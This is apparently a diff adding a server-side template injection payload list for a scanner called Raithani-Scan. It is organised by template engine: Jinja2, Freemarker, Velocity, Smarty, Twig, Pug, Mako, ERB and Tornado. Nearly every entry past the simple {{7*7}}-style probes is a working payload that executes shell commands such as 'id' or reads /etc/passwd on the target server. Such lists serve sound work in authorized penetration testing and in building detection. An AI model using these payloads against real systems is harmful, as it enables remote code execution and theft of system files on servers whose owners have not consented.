@@ -1,0 +1,100 @@
+# SSTI Payloads - Raithani-Scan
+# ================================
+# Jinja2 / Twig / Nunjucks (Python/JS)
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{self}}
+{{request}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{url_for.__globals__['os'].popen('id').read()}}
+{{get_flashed_messages.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__['os'].popen('id').read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{"".__class__.__mro__[1].__subclasses__()}}
+{{"".__class__.__mro__[2].__subclasses__()}}
+
+# Freemarker (Java)
+${7*7}
+${7*'7'}
+${7*7}
+${7*'7'}
+${"test"[0]}
+${"test".charAt(0)}
+${'test'?upper_case}
+${'test'?length}
+${'test'?index_of('t')}
+${.version}
+${.globals}
+${.main}
+${.locale}
+${product.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
+${product.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
+${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+
+# Velocity (Java)
+#set($x=7*7)$x
+#set($x="test")$x
+#set($x=$foo.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id'))$x
+#set($e="e")$foo.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')
+
+# Smarty (PHP)
+{$smarty.version}
+{$smarty.now}
+{7*7}
+{$smarty.const.true}
+{php}echo `id`;{/php}
+{php}echo shell_exec('id');{/php}
+{system('id')}
+{exec('id')}
+{shell_exec('id')}
+{file_get_contents('/etc/passwd')}
+{readfile('/etc/passwd')}
+
+# Twig (PHP)
+{{7*7}}
+{{7*'7'}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}
+{{_self.env.getFilter("id")}}
+{{_self.env.getFilter("cat /etc/passwd")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# Pug / Jade (Node.js)
+#{7*7}
+#{function(){return 7*7}()}
+#{global.process.mainModule.require('child_process').execSync('id')}
+#{(function(){return global.process.mainModule.require('child_process').execSync('id')})()}
+
+# Mako (Python)
+${self.module.cache.util.os.popen('id').read()}
+${self.module.runtime.util.os.popen('id').read()}
+${self.import('os').popen('id').read()}
+${self.import_('os').popen('id').read()}
+
+# ERB / Ruby
+<%= 7*7 %>
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read %>
+<%= File.read('/etc/passwd') %>
+<%= File.open('/etc/passwd').read %>
+<%= %x(id) %>
+
+# Tornado (Python)
+{{7*7}}
+{{'7'*7}}
+{% import os %}{{ os.popen('id').read() }}
+{% import subprocess %}{{ subprocess.check_output('id', shell=True) }}
